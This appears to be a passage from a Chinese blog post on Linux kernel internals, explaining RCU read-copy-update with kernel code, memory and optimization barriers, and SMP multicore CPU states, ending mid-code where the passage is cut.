<p>1、在读取过程中，另外一个线程删除了一个节点。删除线程可以把这个节点从链表中移除，但它不能直接销毁这个节点，必须等到所有的读取线程读取完成以后，才进行销毁操作。RCU中把这个过程称为宽限期（Grace period）。</p>
<p>2、在读取过程中，另外一个线程插入了一个新节点，而读线程读到了这个节点，那么需要保证读到的这个节点是完整的。这里涉及到了发布-订阅机制（Publish-Subscribe Mechanism）。</p>
<p>3、保证读取链表的完整性。新增或者删除一个节点，不至于导致遍历一个链表从中间断开。但是RCU并不保证一定能读到新增的节点或者不读到要被删除的节点。</p>
<p>RCU(Read-Copy  Update)，顾名思义就是读-拷贝更新，它是基于其原理命名的。对于被RCU保护的共享数据结构，读者不需要获得任何锁就可以访问它，但写者在访问它时首先拷贝一个副本，然后对副本进行修改，最后使用一个回调（callback）机制在适当的时机把指向原来数据的指针重新指向新的被修改的数据。那么这个“适当的时机”是怎么确定的呢？这是由内核确定的，也是我们后面讨论的重点。</p>
<h2 id="RCU-原理"><a href="#RCU-原理" class="headerlink" title="RCU 原理"></a>RCU 原理</h2><p>RCU实际上是一种改进的rwlock，读者几乎没有什么同步开销，它不需要锁，不使用原子指令，而且在除alpha的所有架构上也不需要内存栅（Memory  Barrier），因此不会导致锁竞争，内存延迟以及流水线停滞。不需要锁也使得使用更容易，因为死锁问题就不需要考虑了。写者的同步开销比较大，它需要延迟数据结构的释放，复制被修改的数据结构，它也必须使用某种锁机制同步并行的其它写者的修改操作。</p>
<p>读者必须提供一个信号给写者以便写者能够确定数据可以被安全地释放或修改的时机。有一个专门的垃圾收集器来探测读者的信号，一旦所有的读者都已经发送信号告知它们都不在使用被RCU保护的数据结构，垃圾收集器就调用回调函数完成最后的数据释放或修改操作。</p>
<p>RCU 既允许多个读者同时访问被保护的数据，又允许多个读者和多个写者同时访问被保护的数据（注意：是否可以有多个写者并行访问取决于写者之间使用的同步机制），读者没有任何同步开销，而写者的同步开销则取决于使用的写者间同步机制。</p>
<p>读者在访问被RCU保护的共享数据期间不能被阻塞，这是RCU机制得以实现的一个基本前提，也就说当读者在引用被RCU保护的共享数据期间，读者所在的CPU不能发生上下文切换。写者在访问被RCU保护的共享数据时不需要和读者竞争任何锁，只有在有多于一个写者的情况下需要获得某种锁以与其他写者同步。</p>
<h2 id="RCU-核心-API"><a href="#RCU-核心-API" class="headerlink" title="RCU 核心 API"></a>RCU 核心 API</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">rcu_read_lock()</span><br><span class="line">rcu_read_unlock()</span><br><span class="line"></span><br><span class="line">synchronize_rcu()</span><br><span class="line"></span><br><span class="line">rcu_assign_pointer()</span><br><span class="line">rcu_dereference()</span><br></pre></td></tr></table></figure></div>

<p>其中，<code>rcu_read_lock()</code>和<code>rcu_read_unlock()</code>用来保持一个读者的RCU临界区.在该临界区内不允许发生上下文切换。</p>
<p>为什么不能发生切换呢？因为内核要根据“是否发生过切换”来判断读者是否已结束读操作，我们后面再分析。</p>
<p>而下列的函数用于实现内存屏障的作用。</p>
<ul>
<li><code>rcu_dereference()</code>：读者调用它来获得一个被RCU保护的指针。</li>
<li><code>rcu_assign_pointer()</code>：写者使用该函数来为被RCU保护的指针分配一个新的值。</li>
</ul>
<p>注意，<code>synchronize_rcu()</code>：这是RCU的核心所在，它挂起写者，等待读者都退出后释放老的数据。</p>
<h3 id="增加链表项"><a href="#增加链表项" class="headerlink" title="增加链表项"></a>增加链表项</h3><p>Linux kernel 中利用 RCU 往链表增加项的源码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> list_next_rcu(list)     (*((struct list_head __rcu **)(&amp;(list)-&gt;next)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __list_add_rcu(<span class="keyword">struct</span> list_head *new,</span><br><span class="line">                <span class="keyword">struct</span> list_head *prev, <span class="keyword">struct</span> list_head *next)</span><br><span class="line">&#123;</span><br><span class="line">        new-&gt;next = next;</span><br><span class="line">        new-&gt;prev = prev;</span><br><span class="line">        rcu_assign_pointer(list_next_rcu(prev), new);</span><br><span class="line">        next-&gt;prev = new;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>list_next_rcu() </code>函数中的 rcu 是一个供代码分析工具 Sparse 使用的编译选项，规定有 rcu   标签的指针不能直接使用，而需要使用 <code>rcu_dereference() </code>返回一个受 RCU   保护的指针才能使用。<code>rcu_dereference() </code>接口的相关知识会在后文介绍，这一节重点关注 <code>rcu_assign_pointer() </code> 接口。首先看一下 <code>rcu_assign_pointer() </code>的源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __rcu_assign_pointer(p, v, space) \</span></span><br><span class="line"><span class="meta">    (&#123; \</span></span><br><span class="line"><span class="meta">        smp_wmb(); \</span></span><br><span class="line"><span class="meta">        (p) = (typeof(*v) __force space *)(v); \</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br></pre></td></tr></table></figure></div>

<p>上述代码的最终效果是把 v 的值赋值给 p，关键点在于第 3 行的内存屏障。什么是内存屏障（Memory Barrier）呢？CPU 采用流水线技术执行指令时，只保证有内存依赖关系的指令的执行顺序，例如 p &#x3D; v; a &#x3D; *p;，由于第 2 条指令访问的指针 p   所指向的内存依赖于第 1 条指令，因此 CPU 会保证第 1 条指令在第 2 条指令执行前执行完毕。但对于没有内存依赖的指令，例如上述   <code>__list_add_rcu() </code>接口中，假如把第 8 行写成 <code>prev-&gt;next = new;</code>，由于这个赋值操作并没涉及到对 new  指针指向的内存的访问，因此认为不依赖于 6,7 行对 <code>new-&gt;next</code> 和 <code>new-&gt;prev</code> 的赋值，CPU   有可能实际运行时会先执行 <code>prev-&gt;next = new;</code> 再执行 <code>new-&gt;prev = prev;</code>，这就会造成 new   指针（也就是新加入的链表项）还没完成初始化就被加入了链表中，假如这时刚好有一个读者刚好遍历访问到了该新的链表项（因为 RCU   的一个重要特点就是可随意执行读操作），就会访问到一个未完成初始化的链表项！通过设置内存屏障就能解决该问题，它保证了在内存屏障前边的指令一定会先于内存屏障后边的指令被执行。这就保证了被加入到链表中的项，一定是已经完成了初始化的。</p>
<p>最后提醒一下，这里要注意的是，如果可能存在多个线程同时执行添加链表项的操作，添加链表项的操作需要用其他同步机制（如 spin_lock 等）进行保护。</p>
<h3 id="访问链表项"><a href="#访问链表项" class="headerlink" title="访问链表项"></a>访问链表项</h3><p>Linux kernel 中访问 RCU 链表项常见的代码模式是：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">rcu_read_lock();</span><br><span class="line">list_for_each_entry_rcu(pos, head, member) &#123;</span><br><span class="line">    <span class="comment">// do something with `pos`</span></span><br><span class="line">&#125;</span><br><span class="line">rcu_read_unlock();</span><br></pre></td></tr></table></figure></div>

<p>这里要讲到的 <code>rcu_read_lock()</code> 和 <code>rcu_read_unlock()</code>，是 RCU “随意读”   的关键，它们的效果是声明了一个读端的临界区（read-side critical   sections）。在说读端临界区之前，我们先看看读取链表项的宏函数   list_for_each_entry_rcu。追溯源码，获取一个链表项指针主要调用的是一个名为 <code>rcu_dereference()</code>  的宏函数，而这个宏函数的主要实现如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __rcu_dereference_check(p, c, space) \</span></span><br><span class="line"><span class="meta">    (&#123; \</span></span><br><span class="line"><span class="meta">        typeof(*p) *_________p1 = (typeof(*p)*__force )ACCESS_ONCE(p); \</span></span><br><span class="line"><span class="meta">        rcu_lockdep_assert(c, <span class="string">&quot;suspicious rcu_dereference_check()&quot;</span> \</span></span><br><span class="line"><span class="meta">                      <span class="string">&quot; usage&quot;</span>); \</span></span><br><span class="line"><span class="meta">        rcu_dereference_sparse(p, space); \</span></span><br><span class="line"><span class="meta">        smp_read_barrier_depends(); \</span></span><br><span class="line"><span class="meta">        ((typeof(*p) __force __kernel *)(_________p1)); \</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line"><span class="comment">// 第 3 行：声明指针 _p1 = p;</span></span><br><span class="line"><span class="comment">// 第 7 行：smp_read_barrier_depends();</span></span><br><span class="line"><span class="comment">// 第 8 行：返回 _p1;</span></span><br></pre></td></tr></table></figure></div>

<p>上述两块代码，实际上可以看作这样一种模式：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">rcu_read_lock();</span><br><span class="line">p1 = rcu_dereference(p);</span><br><span class="line"><span class="keyword">if</span> (p1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">// do something with p1, such as:</span></span><br><span class="line">    printk(<span class="string">&quot;%d\n&quot;</span>, p1-&gt;field);</span><br><span class="line">&#125;</span><br><span class="line">rcu_read_unlock();</span><br></pre></td></tr></table></figure></div>

<p>根据 <code>rcu_dereference()</code> 的实现，最终效果就是把一个指针赋值给另一个，那如果把上述第 2 行的 <code>rcu_dereference()</code> 直接写成 p1 &#x3D; p 会怎样呢？在一般的处理器架构上是一点问题都没有的。但在 alpha 上，编译器的   value-speculation 优化选项据说可能会“猜测” p1 的值，然后重排指令先取值 p1-&gt;field~ 因此 Linux   kernel 中，smp_read_barrier_depends() 的实现是架构相关的，arm、x86 等架构上是空实现，alpha   上则加了内存屏障，以保证先获得 p 真正的地址再做解引用。因此上一节 “增加链表项” 中提到的 “__rcu” 编译选项强制检查是否使用   rcu_dereference() 访问受 RCU 保护的数据，实际上是为了让代码拥有更好的可移植性。</p>
<p>现在回到读端临界区的问题上来。多个读端临界区不互斥，即多个读者可同时处于读端临界区中，但一块内存数据一旦能够在读端临界区内被获取到指针引用，这块内存块数据的释放必须等到读端临界区结束，等待读端临界区结束的 Linux kernel API   是synchronize_rcu()。读端临界区的检查是全局的，系统中有任何的代码处于读端临界区，synchronize_rcu()   都会阻塞，知道所有读端临界区结束才会返回。为了直观理解这个问题，举以下的代码实例：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* `p` 指向一块受 RCU 保护的共享数据 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* reader */</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">p1 = rcu_dereference(p);</span><br><span class="line"><span class="keyword">if</span> (p1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    printk(<span class="string">&quot;%d\n&quot;</span>, p1-&gt;field);</span><br><span class="line">&#125;</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* free the memory */</span></span><br><span class="line">p2 = p;</span><br><span class="line"><span class="keyword">if</span> (p2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    p = <span class="literal">NULL</span>;</span><br><span class="line">    synchronize_rcu();</span><br><span class="line">    kfree(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>用以下图示来表示多个读者与内存释放线程的时序关系：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/2120938-20210531162259502-679485193.png"
                      alt="img"
                ></p>
<p>上图中，每个读者的方块表示获得 p 的引用（第5行代码）到读端临界区结束的时间周期；t1 表示 p &#x3D; NULL 的时间；t2 表示   <code>synchronize_rcu()</code> 调用开始的时间；t3 表示 <code>synchronize_rcu()</code> 返回的时间。我们先看 Reader1,2,3，虽然这 3 个读者的结束时间不一样，但都在 t1 前获得了 p 地址的引用。t2 时调用 <code>synchronize_rcu()</code>，这时 Reader1 的读端临界区已结束，但 Reader2,3 还处于读端临界区，因此必须等到   Reader2,3 的读端临界区都结束，也就是 t3，t3 之后，就可以执行 kfree(p2) 释放内存。synchronize_rcu()  阻塞的这一段时间，有个名字，叫做 Grace period。而 Reader4,5,6，无论与 Grace period   的时间关系如何，由于获取引用的时间在 t1 之后，都无法获得 p 指针的引用，因此不会进入 p1 !&#x3D; NULL 的分支。</p>
<h3 id="删除链表项"><a href="#删除链表项" class="headerlink" title="删除链表项"></a>删除链表项</h3><p>知道了前边说的 Grace period，理解链表项的删除就很容易了。常见的代码模式是：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">p = seach_the_entry_to_delete();</span><br><span class="line">list_del_rcu(p-&gt;<span class="built_in">list</span>);</span><br><span class="line">synchronize_rcu();</span><br><span class="line">kfree(p);</span><br><span class="line"><span class="comment">/* 其中 list_del_rcu() 的源码如下，把某一项移出链表：*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* list.h */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __list_del(<span class="keyword">struct</span> list_head * prev, <span class="keyword">struct</span> list_head * next)</span><br><span class="line">&#123;</span><br><span class="line">    next-&gt;prev = prev;</span><br><span class="line">    prev-&gt;next = next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rculist.h */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">list_del_rcu</span><span class="params">(<span class="keyword">struct</span> list_head *entry)</span></span><br><span class="line">&#123;</span><br><span class="line">    __list_del(entry-&gt;prev, entry-&gt;next);</span><br><span class="line">    entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据上一节“访问链表项”的实例，假如一个读者能够从链表中获得我们正打算删除的链表项，则肯定在<code> synchronize_rcu()</code>之前进入了读端临界区，<code>synchronize_rcu()</code>就会保证读端临界区结束时才会真正释放链表项的内存，而不会释放读者正在访问的链表项。</p>
<h3 id="更新链表项"><a href="#更新链表项" class="headerlink" title="更新链表项"></a>更新链表项</h3><p>前文提到，RCU 的更新机制是 “Copy Update”，RCU 链表项的更新也是这种机制，典型代码模式是：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">p = search_the_entry_to_update();</span><br><span class="line">q = kmalloc(<span class="keyword">sizeof</span>(*p), GFP_KERNEL);</span><br><span class="line">*q = *p;</span><br><span class="line">q-&gt;field = new_value;</span><br><span class="line">list_replace_rcu(&amp;p-&gt;<span class="built_in">list</span>, &amp;q-&gt;<span class="built_in">list</span>);</span><br><span class="line">synchronize_rcu(); <span class="comment">// 挂起写者，等待读者全部结束</span></span><br><span class="line">kfree(p); <span class="comment">// 释放老数据</span></span><br></pre></td></tr></table></figure></div>

<p>其中第 3,4 行就是复制一份副本，并在副本上完成更新，然后调用 <code>list_replace_rcu()</code> 用新节点替换掉旧节点，最后释放旧节点内存。</p>
<p><code>list_replace_rcu()</code> 源码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">list_replace_rcu</span><span class="params">(<span class="keyword">struct</span> list_head *old,</span></span><br><span class="line"><span class="params">                <span class="keyword">struct</span> list_head *new)</span></span><br><span class="line">&#123;</span><br><span class="line">    new-&gt;next = old-&gt;next;</span><br><span class="line">    new-&gt;prev = old-&gt;prev;</span><br><span class="line">    rcu_assign_pointer(list_next_rcu(new-&gt;prev), new);</span><br><span class="line">    new-&gt;next-&gt;prev = new;</span><br><span class="line">    old-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="内存屏障与优化屏障"><a href="#内存屏障与优化屏障" class="headerlink" title="内存屏障与优化屏障"></a>内存屏障与优化屏障</h1><p>我们都知道，带有优化的编译器，会尝试重新排序汇编指令，以提高程序的执行速度。但是，当在处理同步问题的时候，重新排序的指令应该被避免。因为重新排序可能会打乱我们之前想要的同步效果。其实，所有的同步原语都可以充当优化和内存屏障。</p>
<h2 id="优化屏障"><a href="#优化屏障" class="headerlink" title="优化屏障"></a>优化屏障</h2><p>编译器编译源代码时，会将源代码进行优化，将源代码的指令进行重排序，以适合于CPU的并行执行。然而，内核同步必须避免指令重新排序，优化屏障（Optimization barrier）避免编译器的重排序优化操作，保证编译程序时在优化屏障之前的指令不会在优化屏障之后执行。</p>
<p>Linux用宏barrier实现优化屏障，gcc编译器的优化屏障宏定义列出如下（在include&#x2F;linux&#x2F;compiler-gcc.h中）：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">#define barrier() __asm__ __volatile__(&quot;&quot;: : :&quot;memory&quot;)</span><br></pre></td></tr></table></figure></div>

<p>上述定义中，“asm”表示插入了汇编语言程序，“volatile”表示阻止编译器对该值进行优化，确保变量使用了用户定义的精确地址，而不是装有同一信息的一些别名。“memory”表示指令修改了内存单元。</p>
<h2 id="内存屏障"><a href="#内存屏障" class="headerlink" title="内存屏障"></a>内存屏障</h2><p>软件可通过读写屏障强制内存访问次序。读写屏障像一堵墙，所有在设置读写屏障之前发起的内存访问，必须先于在设置屏障之后发起的内存访问之前完成，确保内存访问按程序的顺序完成。</p>
<p>读写屏障通过处理器构架的特殊指令mfence（内存屏障）、lfence（读屏障）和sfence（写屏障）完成。另外，在x86-64处理器中，对硬件进行操作的汇编语言指令是“串行的”，也具有内存屏障的作用，如：对I&#x2F;O端口进行操作的所有指令、带lock前缀的指令以及写控制寄存器、系统寄存器或调试寄存器的所有指令（如：cli和sti）。</p>
<p>内存屏障可用于多处理器和单处理器系统，如果仅用于多处理器系统，就使用smp_xxx函数，在单处理器系统上，它们什么都不要。</p>
<table>
<thead>
<tr>
<th>内存屏障的宏定义</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>mb()</td>
<td>适用于多处理器和单处理器的内存屏障。</td>
</tr>
<tr>
<td>rmb()</td>
<td>适用于多处理器和单处理器的读内存屏障。</td>
</tr>
<tr>
<td>wmb()</td>
<td>适用于多处理器和单处理器的写内存屏障。</td>
</tr>
<tr>
<td>smp_mb()</td>
<td>适用于多处理器的内存屏障。</td>
</tr>
<tr>
<td>smp_rmb()</td>
<td>适用于多处理器的读内存屏障。</td>
</tr>
<tr>
<td>smp_wmb()</td>
<td>适用于多处理器的写内存屏障。</td>
</tr>
</tbody></table>
<p>适合于多处理器和单处理器的内存屏障宏定义列出如下（在include&#x2F;asm-x86&#x2F;system.h中）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 指令“lock; addl $0,0(%%esp)”表示加锁，把0加到栈顶的内存单元，该指令操作本身无意义，但这些指令起到内存屏障的作用，</span></span><br><span class="line"><span class="comment"> * 让前面的  指令执行完成。具有XMM2特征的CPU已有内存屏障指令，就直接使用该指令</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mb() alternative(<span class="string">&quot;lock; addl $0,0(%%esp)&quot;</span>, <span class="string">&quot;mfence&quot;</span>, X86_FEATURE_XMM2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rmb() alternative(<span class="string">&quot;lock; addl $0,0(%%esp)&quot;</span>, <span class="string">&quot;lfence&quot;</span>, X86_FEATURE_XMM2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> wmb() alternative(<span class="string">&quot;lock; addl $0,0(%%esp)&quot;</span>, <span class="string">&quot;sfence&quot;</span>, X86_FEATURE_XMM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mb() asm volatile(<span class="string">&quot;mfence&quot;</span>:::<span class="string">&quot;memory&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rmb() asm volatile(<span class="string">&quot;lfence&quot;</span>:::<span class="string">&quot;memory&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> wmb() asm volatile(<span class="string">&quot;sfence&quot;</span> ::: <span class="string">&quot;memory&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*刷新后面的读所依赖的所有挂起读操作，在x86-64构架上不需要*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> read_barrier_depends() do &#123; &#125; while (0)</span></span><br></pre></td></tr></table></figure></div>

<p>宏定义ead_barrier_depends()刷新后面的读所依赖的所有挂起读操作，后面的读操作依赖于正处理的读操作返回的数据。在x86-64构架上不需要此宏。它表明：在此屏障之前，没有来自内存区域数据所依赖的读曾经重排序。所有的读操作处理此原语，保证在跟随此原语的任何读操作此原语之前访问内存（但不需要其他CPU的cache）。此原语在大多数CPU上有比rmb()更轻的份量。</p>
<p>本地CPU和编译器遵循内存屏障的排序限制，仅内存屏障原语保证排序，即使数据有依赖关系，也不能保证排序。例如：下面代码将强迫排序，因为*q的读操作依赖于p的读操作，并且这两个读操作被read_barrier_depends()分开。在CPU 0和CPU 1上执行的程序语句分别列出如下：</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">1. CPU 0                                      1. CPU 1</span><br><span class="line">2. b = 2;									  2.</span><br><span class="line">3. memory_barrier();						  3.</span><br><span class="line">4. p = &amp;b;                                    4. q = p;</span><br><span class="line">                                              5. read_barrier_depends();</span><br><span class="line">                                              6. d = *q;</span><br></pre></td></tr></table></figure></div>

<p>下面的代码没有强制排序，因为在a和b的读操作之间没有依赖关系，因此，在一些CPU上，如：Alpha，y将设置为3，x设置为0。类似这种没有数据依赖关系的读操作，需要排序应使用rmb()。</p>
<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">1. CPU 0                                      1. CPU 1</span><br><span class="line">2. a = 2;									  2.</span><br><span class="line">3. memory_barrier();						  3.</span><br><span class="line">4. b = 3;                                     4. y = b;</span><br><span class="line">                                              5. read_barrier_depends();</span><br><span class="line">                                              6. x = a;</span><br></pre></td></tr></table></figure></div>

<p>适合于多处理器的内存屏障宏定义列出如下（在include&#x2F;asm-x86&#x2F;system.h中）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smp_mb() mb()</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_PPRO_FENCE</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> smp_rmb() rmb()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> smp_rmb() barrier()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_OOSTORE</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> smp_wmb() wmb()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> smp_wmb() barrier()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smp_read_barrier_depends() read_barrier_depends()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_mb(var, value) do &#123; (void)xchg(&amp;var, value); &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smp_mb() barrier()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smp_rmb() barrier()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smp_wmb() barrier()</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smp_read_barrier_depends() do &#123; &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_mb(var, value) do &#123; var = value; barrier(); &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>函数rdtsc_barrier用于加内存屏障阻止RDTSC猜测，当在一个定义的代码区域使用读取时间戳计数器（Read Time-Stamp  Counter，RDTSC）函数（或者函数get_cycles或vread）时，必须加内存屏障阻止RDTSC猜测。其列出如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">rdtsc_barrier</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    alternative(ASM_NOP3, <span class="string">&quot;mfence&quot;</span>, X86_FEATURE_MFENCE_RDTSC);</span><br><span class="line">    alternative(ASM_NOP3, <span class="string">&quot;lfence&quot;</span>, X86_FEATURE_LFENCE_RDTSC);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="内核内存布局"><a href="#内核内存布局" class="headerlink" title="内核内存布局"></a>内核内存布局</h1><p>具体在内存管理分析。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/6-1.png"
                      alt="6-1"
                ></p>
<h1 id="多核调度分析"><a href="#多核调度分析" class="headerlink" title="多核调度分析"></a>多核调度分析</h1><p><a class="link"   href="https://blog.csdn.net/weixin_52622200/article/details/135886010" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="多核调度"><a href="#多核调度" class="headerlink" title="多核调度"></a>多核调度</h2><p>SMP（Symmetric Multiprocessing，对称多处理）是一种常见的多核处理器架构。它将多个处理器集成到一个计算机系统中，并通过共享系统总线和内存子系统来实现处理器之间的通信。</p>
<p>首先，SMP架构将一组处理器集中在同一个计算机上。这些处理器可以是物理上独立的芯片，也可以是在同一芯片上集成的多个核心。无论是物理上独立的处理器还是集成在同一芯片上的核心，它们都可以同时工作，处理不同的任务。</p>
<p>在SMP架构中，各处理器是对等的，也就是说它们具有相同的权限和地位。每个处理器都可以独立地执行任务，并且可以访问共享的系统总线和内存子系统。这意味着不同的处理器可以同时读取和写入内存，从而实现数据的共享和协同处理。</p>
<p>通过共享系统总线和内存子系统，SMP架构实现了处理器之间的通信和协作。处理器可以通过总线发送和接收数据，从而进行协同工作。例如，一个处理器可以将计算结果存储在内存中，而另一个处理器可以读取该结果并继续后续的计算。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/uma.png"
                      alt="uma"
                ></p>
<p>根据处理器的实际物理属性，CPU可以分为超线程和多核。</p>
<ul>
<li><strong>超线程（SMT，Simultaneous  Multithreading）：</strong></li>
</ul>
<p>Linux内核分类位 <code>CONFIG_SCHED_SMT</code>，超线程是一种技术，允许单个物理处理器核心模拟出多个逻辑处理器核心。这意味着在一个物理处理器核心上可以并行执行多个线程，从而提高处理器的利用率和性能。在Linux内核中，针对超线程技术，可以使用CONFIG_SCHED_SMT进行分类和配置。</p>
<ul>
<li><strong>多核（MC，Multiple Cores）：</strong></li>
</ul>
<p>Linux内核分类位 <code>CONFIG_SCHED_MC</code>，多核处理器是指在一个集成电路芯片上集成了多个独立的物理处理器核心。每个核心都可以独立地执行任务，因此多核处理器可以同时处理多个线程或进程，从而提高系统的并行处理能力和整体性能。在Linux内核中，针对多核处理器，可以使用CONFIG_SCHED_MC进行分类和配置。</p>
<p>Linux内核对CPU管理主要是通过使用bitmap来实现，同时定义了四种状态：possible、online、active、present。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* 可能状态（possible）：表示系统中存在但尚未启用的CPU。这意味着该CPU是硬件上存在的，</span></span><br><span class="line"><span class="comment">* 但由于某些原因（例如节能策略或热插拔功能），暂时没有被激活。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">cpumask</span> __<span class="title">cpu_possible_mask</span>;</span></span><br><span class="line"><span class="comment">/* 在线状态（online）：表示CPU已经被启用并且处于可用状态。在线状态的CPU可以处理任务和线程，并参与系统的运行。*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">cpumask</span> __<span class="title">cpu_online_mask</span>;</span></span><br><span class="line"><span class="comment">/* 活跃状态（active）：表示CPU正在执行任务或线程，即处于活动状态。这是指当前正在被利用的CPU核心。 */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">cpumask</span> __<span class="title">cpu_present_mask</span>;</span></span><br><span class="line"><span class="comment">/* 存在状态（present）：表示该CPU核心是物理上存在的，即硬件上存在该CPU核心。 */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">cpumask</span> __<span class="title">cpu_active_mask</span>;</span></span><br><span class="line"><span class="comment">// 系统上有多少个可以执行的cpu核心</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 